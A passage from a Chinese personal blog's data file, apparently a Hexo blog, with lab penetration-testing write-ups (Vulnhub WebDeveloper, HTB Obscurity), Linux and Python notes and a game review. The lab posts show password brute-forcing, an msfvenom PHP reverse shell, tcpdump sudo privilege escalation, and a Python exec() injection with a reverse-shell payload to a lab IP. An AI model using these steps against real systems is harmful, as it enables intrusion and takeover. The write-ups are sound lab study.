alt></p><p>发现a.out</p><p><img src="/posts/fcea4f6a/1576581569529.png" alt><br>猜测其运行的是whoami命令</p><p>通过环境变量提权<br><img src="/posts/fcea4f6a/1576581656579.png" alt></p><p>同样拿到flag<br><img src="/posts/fcea4f6a/1576581679658.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-kill</title>
      <link href="/posts/da023d5c/"/>
      <url>/posts/da023d5c/</url>
      
        <content type="html"><![CDATA[<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>首先需要熟悉一下 ps 命令</p><p>一般通过 <code>ps aux | more</code> 查看到所有的进程</p><p><code>ps -e</code> 列出程序时，显示每个程序所使用的环境变量</p><p><code>ps u</code> 　 以用户为主的格式来显示程序状况。</p><p><code>ps -a</code>显示同一终端下的所有程序</p><p><code>ps a</code> 显示所有进程</p><h2 id="kill-命令"><a href="#kill-命令" class="headerlink" title="kill 命令"></a>kill 命令</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令trick</title>
      <link href="/posts/ebe7281d/"/>
      <url>/posts/ebe7281d/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的命令组合"><a href="#常用的命令组合" class="headerlink" title="常用的命令组合"></a>常用的命令组合</h2><p><strong>统计字符串长度</strong></p><pre><code class="bash">$ echo -n 12345 | wc -c5</code></pre><h2 id="搜索文件后门"><a href="#搜索文件后门" class="headerlink" title="搜索文件后门"></a>搜索文件后门</h2><pre><code class="bash"># 简单的查找后门find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h2 id="数据库备份-mysqldump用法"><a href="#数据库备份-mysqldump用法" class="headerlink" title="数据库备份 mysqldump用法"></a>数据库备份 mysqldump用法</h2><pre><code class="bash">mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库mysqldump --all-databases &gt; bak.sql //备份所有数据库mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库//也可以登录到mysql之后再 source xxx.sql</code></pre><h2 id="mysql-修改密码"><a href="#mysql-修改密码" class="headerlink" title="mysql 修改密码"></a>mysql 修改密码</h2><pre><code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);Query OK, 0 rows affected, 1 warning (0.00 sec)</code></pre><p>但是这条命令似乎不行</p><pre><code>update user set password=PASSWORD(&#39;NEW PASSWORD&#39;) where user=&#39;root&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-WebDeveloper</title>
      <link href="/posts/4d0603d0/"/>
      <url>/posts/4d0603d0/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p><p>使用 <code>wpscan</code> 扫描用户和插件</p><pre><code>wpscan --url http://192.168.99.100/ -e u,p </code></pre><p>发现了用户 <code>webdeveloper</code></p><p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p><pre><code>wpscan --url http://192.168.99.100/ -U webdeveloper  -P ./rockyou.txthydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:login_error&quot;</code></pre><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也为探测到相关信息</p><p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p><p>换用了 <code>dirb</code></p><pre><code>GENERATED WORDS: 4613                                                          ---- Scanning URL: http://192.168.99.100/ ----+ http://192.168.99.100/index.php (CODE:301|SIZE:0)                                                                                                         ==&gt; DIRECTORY: http://192.168.99.100/ipdata/   !!!                                                                                                             + http://192.168.99.100/server-status (CODE:403|SIZE:302)                                                                                                   ==&gt; DIRECTORY: http://192.168.99.100/wp-admin/                                                                                                              ==&gt; DIRECTORY: http://192.168.99.100/wp-content/                                                                                                            ==&gt; DIRECTORY: http://192.168.99.100/wp-includes/                                                                                                           + http://192.168.99.100/xmlrpc.php (CODE:405|SIZE:42)       </code></pre><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p><p>打开之后过滤</p><pre><code>http.request.method == &quot;POST&quot;</code></pre><p><img src="/posts/4d0603d0/1580996926610.png" alt></p><p>原来密码这么复杂。怪不得爆破不出来</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.99.1 lport=4444 -f raw -o shell.php</code></pre><p>修改一个插件的源码然后启用就能拿到shell了</p><p>然后查看 <code>wp-config.php</code></p><pre><code>// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);/** MySQL database username */define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);/** MySQL hostname */define(&#39;DB_HOST&#39;, &#39;localhost&#39;);/** Database Charset to use in creating database tables. */define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);/** The Database Collate type. Don&#39;t change this if in doubt. */define(&#39;DB_COLLATE&#39;, &#39;&#39;);</code></pre><p>获得了数据库的账号和密码，那就登陆一下数据库</p><p>但是在数据库中并没有获得很多信息</p><pre><code>mysql&gt; show tables;show tables;+-----------------------+| Tables_in_wordpress   |+-----------------------+| wp_commentmeta        || wp_comments           || wp_links              || wp_options            || wp_postmeta           || wp_posts              || wp_term_relationships || wp_term_taxonomy      || wp_termmeta           || wp_terms              || wp_usermeta           || wp_users              |+-----------------------+12 rows in set (0.00 sec</code></pre><p>尝试直接ssh登陆，居然可以！</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>那就可以用 <code>tcpdump</code> 提权了</p><pre><code class="bash">webdeveloper@webdeveloper:~$ touch /tmp/exploitwebdeveloper@webdeveloper:~$ echo &quot;cat /root/flag.txt&quot; &gt; /tmp/exploitwebdeveloper@webdeveloper:~$ chmod +x /tmp/exploitwebdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root[sudo] password for webdeveloper:dropped privs to roottcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytesMaximum file limit reached: 11 packet captured710 packets received by filter0 packets dropped by kernelwebdeveloper@webdeveloper:~$ Congratulations here is youre flag:cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-tcpdump</title>
      <link href="/posts/9cc474ce/"/>
      <url>/posts/9cc474ce/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>-i 指定网卡接口</li><li>-c 指定数量</li><li>-w 保存的文件名</li><li>-z 指定脚本</li><li>-Z 指定用户</li></ul><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p><pre><code>tcpdump host 210.27.48.1 </code></pre><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p><pre><code>tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \) </code></pre><p>截获主机hostname发送的所有数据</p><pre><code>tcpdump -i eth0 src host hostname</code></pre><p>监视所有送到主机的数据包</p><pre><code>tcpdump -i eth0 dst host hostname</code></pre><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p><pre><code>tcpdump tcp port 23 and host 210.27.48.1</code></pre><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><pre><code>tcpdump udp port 123 </code></pre><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><pre><code>tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></pre><p>抓取http包</p><pre><code>tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</code></pre><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p><pre><code>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><blockquote><p>-z 指定脚本，-Z 指定用户身份</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcpdump </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何保护版权</title>
      <link href="/posts/3b32f749/"/>
      <url>/posts/3b32f749/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰气时代玩后感</title>
      <link href="/posts/69f21310/"/>
      <url>/posts/69f21310/</url>
      
        <content type="html"><![CDATA[<p>寒假正逢steam打折，一直放在愿望单中的冰气时代这会降价了，果断入坑</p><p>买来之后第一把就找不着北了，游戏的玩法还是比较简单，但是前期资源匮乏，我需要收集木炭和木材，我一开始并没有意识到，等我将木材耗尽之后发现没有地方可以收集木材了？？？周围倒是有一些冻树木，但是要建造伐木场才行，wtf???,这游戏难道就到头了？</p><p>之后去找了B站的教程，欸突然意识到原来黑乎乎的一团有些是煤堆，有些是木箱23333，采集木箱可以收集木材。哦这游戏居然可以这样玩啊。这还只是我遇到的第一个坑，后面还遇到了建房子要和道路相连，道路要和能量塔相连等等</p><p> 不过这个游戏设计的比较好的就是法律和不满值了，我一直很担心不满值会升高，但是有些法律又不得不的签署，比如童工，比如加班，如果不这样的话就导致资源收集的速度很慢，大部分时候收集到的煤炭一个晚上就耗完了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件</title>
      <link href="/posts/75a61507/"/>
      <url>/posts/75a61507/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python3字符串</title>
      <link href="/posts/25e898cd/"/>
      <url>/posts/25e898cd/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="性质判定"><a href="#性质判定" class="headerlink" title="性质判定"></a>性质判定</h3><pre><code>isalnum()、isalpha()、isdigit()、islower()、isupper()、isspace()、istitle()、startswith(prefix[,start[, end]])、endswith(suffix[,start[, end]])</code></pre><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><pre><code>count( sub[, start[, end]])、find( sub[, start[,end]])、index( sub[, start[, end]])、rfind( sub[, start[,end]])、rindex(sub[, start[, end]])</code></pre><p>注意find()和index()方法的不同：find()函数族找不到时返回-1，index()函数族则抛出ValueError异常。</p><p>但是对于判定是否包含字串的判定推荐用  <code>in</code> 和 <code>not in</code>操作符</p><p><code>replace(old, new[,count])</code>用以替换字符串的某些子串，如果指定count参数的话，就最多替换count次，如果不指定，就全部替换</p><h3 id="分切和连接"><a href="#分切和连接" class="headerlink" title="分切和连接"></a>分切和连接</h3><p><code>partition()</code> 和 <code>split</code> </p><p>split举例</p><pre><code class="python">&gt;&gt;&gt; &#39; hello     world&#39;.split()[&#39;hello&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39; &#39;)  # 要注意第一种方式和第二种方式不一样[&#39;&#39;, &#39;hello&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39;&#39;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ValueError: empty separator&gt;&gt;&gt; &#39;&#39;.split()[]&gt;&gt;&gt; &#39;&#39;.split(&#39; &#39;)[&#39;&#39;]</code></pre><h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><pre><code>lower()、upper()、capitalize()、swapcase()、title()</code></pre><h3 id="删减与填充"><a href="#删减与填充" class="headerlink" title="删减与填充"></a>删减与填充</h3><pre><code>strip([chars])、lstrip([chars])、rstrip([chars])center(width[, fillchar])、ljust(width[,fillchar])、rjust(width[, fillchar])、zfill(width)、expandtabs([tabsize])</code></pre><p>这些方法中的fillchar参数是指用以填充的字符，默认是空格。而zfill()中的z是指zero，所以顾名思义，zfill()即是以字符0进行填充，在输出数值时比较常用。expandtabs()的tabsize参数默认为8，它的功能是把字符串中的制表符（tab）转换为适当数量的空格。</p><h2 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre><code class="python">In [2]: name = &quot;pxy&quot;In [3]: f&#39;Hello, my name is {name}&#39;Out[3]: &#39;Hello, my name is pxy&#39;</code></pre><p>求值运算</p><pre><code class="python">In [5]: &gt;&gt;&gt; f&#39;Complex number {(2 + 2j) / (2 - 3j)}&#39;Out[5]: &#39;Complex number (-0.15384615384615388+0.7692307692307692j)&#39;In [6]: import mathIn [7]: f&#39;The answer is {math.log(math.pi)}&#39;Out[7]: &#39;The answer is 1.1447298858494002</code></pre><p>f-string大括号内也可填入lambda表达式，但lambda表达式的 <code>:</code> 会被f-string误认为是表达式与格式描述符之间的分隔符，为避免歧义，需要将lambda表达式置于括号 <code>()</code> 内：</p><pre><code class="python">In [1]: f&#39;result is {(lambda x: x ** 2 + 1) (2)}&#39;Out[1]: &#39;result is 5&#39;</code></pre><h2 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h2><h3 id="str转bytes"><a href="#str转bytes" class="headerlink" title="str转bytes"></a>str转bytes</h3><pre><code class="python">In [23]: bytes(a, encoding=&quot;gbk&quot;)Out[23]: b&#39;\xb0\xd9\xb6\xc8&#39;In [24]: bytes(a, encoding=&quot;utf-8&quot;)Out[24]: b&#39;\xe7\x99\xbe\xe5\xba\xa6&#39;</code></pre><h3 id="从十六进制转化为bytes"><a href="#从十六进制转化为bytes" class="headerlink" title="从十六进制转化为bytes"></a>从十六进制转化为bytes</h3><pre><code class="python">In [39]: a = &#39;aabbccddeeff&#39;In [40]: a_bytes = bytes.fromhex(a)In [41]: a_bytesOut[41]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;</code></pre><h3 id="从bytes转化为十六进制"><a href="#从bytes转化为十六进制" class="headerlink" title="从bytes转化为十六进制"></a>从bytes转化为十六进制</h3><pre><code class="python">In [42]: a_bytesOut[42]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;In [43]: a_bytes.hex()Out[43]: &#39;aabbccddeeff&#39;</code></pre><h3 id="base64编码byets"><a href="#base64编码byets" class="headerlink" title="base64编码byets"></a>base64编码byets</h3><p>python3的base64包的 <code>b64encode</code> 只能使用 bytes 类型</p><pre><code class="python"># 比如我们要编码 \xac\xedIn [54]: a = &quot;aced&quot;In [55]: a = bytes.fromhex(a)In [56]: aOut[56]: b&#39;\xac\xed&#39;In [57]: base64.b64encode(a)Out[57]: b&#39;rO0=&#39;</code></pre><h3 id="md5加密bytes"><a href="#md5加密bytes" class="headerlink" title="md5加密bytes"></a>md5加密bytes</h3><p>python3 只能用hashlib中的md5函数</p><pre><code class="python">a = hashlib.md5()a.update(b&quot;pxy&quot;)a.hexdigest()</code></pre><p>封装一下</p><pre><code class="python"># 生成MD5def genearteMD5(str):    # 创建md5对象    hl = hashlib.md5()    # Tips    # 此处必须声明encode    # 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing    hl.update(str.encode(encoding=&#39;utf-8&#39;))    print(&#39;MD5加密前为 ：&#39; + str)    print(&#39;MD5加密后为 ：&#39; + hl.hexdigest())</code></pre><h2 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h2><h3 id="判断字符串是否为空"><a href="#判断字符串是否为空" class="headerlink" title="判断字符串是否为空"></a>判断字符串是否为空</h3><p>用 <code>a == None</code> 是不行的</p><p>可以这样</p><pre><code class="python">a = &quot;&quot;if a.strip() == &quot;&quot;:    print(&quot;a is null&quot;)</code></pre><h3 id="list和str转换"><a href="#list和str转换" class="headerlink" title="list和str转换"></a>list和str转换</h3><pre><code class="python">In [17]: a = &quot;aaaafasfasd&quot;In [18]: list(a)Out[18]: [&#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39;]</code></pre><h3 id="固定长度分割字符串"><a href="#固定长度分割字符串" class="headerlink" title="固定长度分割字符串"></a>固定长度分割字符串</h3><p>传统上一般是遍历</p><pre><code class="python">def fix_width_split(string, width):    return [string[x : x + width] for x in range(0, len(string), width)]print fix_width_split(&#39;123456789&#39;, 3)</code></pre><p>但是如果有了正则，可以这样</p><pre><code class="python">import restring = &#39;123456789&#39;split = re.findall(r&#39;.{7}&#39;, string)</code></pre><p>结果</p><pre><code class="python">In [76]: string = &#39;123456789&#39;In [77]: split = re.findall(&quot;.{3}&quot;, string)In [78]: splitOut[78]: [&#39;123&#39;, &#39;456&#39;, &#39;789&#39;]</code></pre><h3 id="bytes写入文件"><a href="#bytes写入文件" class="headerlink" title="bytes写入文件"></a>bytes写入文件</h3><p>以二进制方式打开即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693" target="_blank" rel="noopener">python格式化字符串f-string</a></p><p><a href="https://www.40huo.cn/blog/python-string-tricks.html" target="_blank" rel="noopener">python字符串trick</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> bytes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Obscurity靶机实战</title>
      <link href="/posts/a0911a0b/"/>
      <url>/posts/a0911a0b/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p><pre><code>10.10.10.168 obscure.htb</code></pre><p>扫描端口发现开放了 <code>8080</code> 的web端口</p><p>页面提示有一个源码泄露</p><pre><code>Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</code></pre><p>那我们就需要爆破目录了</p><p>使用 <code>wfuzz</code></p><pre><code class="bash">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre><p><img src="/posts/a0911a0b/1580912401299.png" alt></p><p>得到源码：</p><pre><code class="python">import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}Date: {dateSent}Server: {server}Last-Modified: {modified}Content-Length: {length}Content-Type: {contentType}Connection: {connectionType}{body}&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = {&quot;200&quot;: &quot;OK&quot;,         &quot;304&quot;: &quot;NOT MODIFIED&quot;,        &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;,         &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;,         &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;,         &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}class Response:    def __init__(self, **kwargs):        self.__dict__.update(kwargs)        now = datetime.now()        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)    def stringResponse(self):        return respTemplate.format(**self.__dict__)class Request:    def __init__(self, request):        self.good = True        try:            request = self.parseRequest(request)            self.method = request[&quot;method&quot;]            self.doc = request[&quot;doc&quot;]            self.vers = request[&quot;vers&quot;]            self.header = request[&quot;header&quot;]            self.body = request[&quot;body&quot;]        except:            self.good = False    def parseRequest(self, request):                req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)        method,doc,vers = req[0].split(&quot; &quot;)        header = req[1:-3]        body = req[-1]        headerDict = {}        for param in header:            pos = param.find(&quot;: &quot;)            key, val = param[:pos], param[pos+2:]            headerDict.update({key: val})        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}class Server:    def __init__(self, host, port):            self.host = host        self.port = port        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        self.sock.bind((self.host, self.port))    def listen(self):        self.sock.listen(5)        while True:            client, address = self.sock.accept()            client.settimeout(60)            threading.Thread(target = self.listenToClient,args = (client,address)).start()    def listenToClient(self, client, address):        size = 1024        while True:            try:                data = client.recv(size) # 收到客户端的数据，应该就是数据包                if data:                    # Set the response to echo back the recieved data                     req = Request(data.decode()) # byte转str，返回的req是list                    self.handleRequest(req, client, address)                    client.shutdown()                    client.close()                else:                    raise error(&#39;Client disconnected&#39;)            except:                client.close()                return False    def handleRequest(self, request, conn, address):        if request.good:#            try:                # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)                # print(&quot;from {0}&quot;.format(address[0]))#            except Exception as e:#                print(e)            document = self.serveDoc(request.doc, DOC_ROOT)            statusNum=document[&quot;status&quot;]        else:            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)            statusNum=&quot;400&quot;        body = document[&quot;body&quot;]        statusCode=CODES[statusNum]        dateSent = &quot;&quot;        server = &quot;BadHTTPServer&quot;        modified = &quot;&quot;        length = len(body)        contentType = document[&quot;mime&quot;] # Try and identify MIME type from string        connectionType = &quot;Closed&quot;        resp = Response(        statusNum=statusNum, statusCode=statusCode,         dateSent = dateSent, server = server,         modified = modified, length = length,         contentType = contentType, connectionType = connectionType,         body = body        )        data = resp.stringResponse()        if not data:            return -1        conn.send(data.encode())        return 0    def serveDoc(self, path, docRoot):        path = urllib.parse.unquote(path)        try:            info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug            exec(info.format(path)) # This is how you do string formatting, right?            cwd = os.path.dirname(os.path.realpath(__file__))            docRoot = os.path.join(cwd, docRoot)            if path == &quot;/&quot;:                path = &quot;/index.html&quot;            requested = os.path.join(docRoot, path[1:])            if os.path.isfile(requested):                mime = mimetypes.guess_type(requested)                mime = (mime if mime[0] != None else &quot;text/html&quot;)                mime = MIMES[requested.split(&quot;.&quot;)[-1]]                try:                    with open(requested, &quot;r&quot;) as f:                        data = f.read()                except:                    with open(requested, &quot;rb&quot;) as f:                        data = f.read()                status = &quot;200&quot;            else:                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)                mime = &quot;text/html&quot;                with open(errorPage, &quot;r&quot;) as f:                    data = f.read().format(path)                status = &quot;404&quot;        except Exception as e:            print(e)            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)            mime = &quot;text/html&quot;            with open(errorPage, &quot;r&quot;) as f:                data = f.read()            status = &quot;500&quot;        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}</code></pre><p>审计源码发现关键点：</p><pre><code class="python">def serveDoc(self, path, docRoot):    path = urllib.parse.unquote(path)    try:        info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug        exec(info.format(path)) # This is how you do string formatting, right?        cwd = os.path.dirname(os.path.realpath(__file__))        docRoot = os.path.join(cwd, docRoot)</code></pre><p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p><p><code>exec</code> 函数处存在命令注入</p><pre><code class="python">In [33]: path = &quot;/&#39;;os.system(&#39;whoami&#39;)#&quot;In [34]: exec(info.format(path))laptop-ubiep4k5\zz</code></pre><p>然后就可以通过python反弹shell了</p><pre><code class="python">import requestsimport urllibimport osurl = &#39;http://10.10.10.168:8080/&#39;path=&#39;5\&#39;&#39;+&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#39;&#39;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text)</code></pre><p>反弹到shell之后继续进行信息收集：</p><p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p><pre><code class="bash">www-data@obscure:/home/robert$ cat check.txtcat check.txtEncrypting this file with your key should result in out.txt, make sure your key is correct!</code></pre><p><code>out.txt</code>, 这个就是加密的结果</p><pre><code>www-data@obscure:/home/robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p><pre><code>www-data@obscure:/home/robert$ hd passwordreminder.txthd passwordreminder.txt00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|0000001b</code></pre><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p><pre><code class="python">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.pycat BetterSSH.pyimport sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))session = {&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0}try:    session[&#39;user&#39;] = input(&quot;Enter username: &quot;)    passW = input(&quot;Enter password: &quot;)    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:        data = f.readlines()    data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]    passwords = []    for x in data:        if not x == None:            passwords.append(x)    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])    with 